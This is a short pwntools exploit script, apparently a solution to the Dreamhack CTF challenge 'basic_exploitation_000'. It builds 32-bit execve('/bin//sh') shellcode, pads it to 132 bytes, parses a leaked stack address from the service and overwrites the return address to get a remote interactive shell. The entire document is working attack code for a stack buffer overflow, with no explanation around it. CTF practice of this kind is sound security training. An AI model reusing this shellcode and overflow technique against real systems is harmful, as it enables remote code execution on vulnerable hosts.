from pwn import *

exe = ELF('./basic_exploitation_000', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 16901)

input()

# Viet shellcode 32bit
shellcode = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov edx, eax
    mov al, 0x8
    inc al
    inc al
    inc al
    int 0x80
    ''', arch='i386')
shellcode = shellcode.ljust(132, b'a')

# leak
p.recvuntil(b'(')
leak = p.recvuntil(b')').strip(b')')
leak = int(leak.decode(), 16)
print("leak: " + hex(leak))

payload = shellcode + p32(leak)
p.sendline(payload)

p.interactive()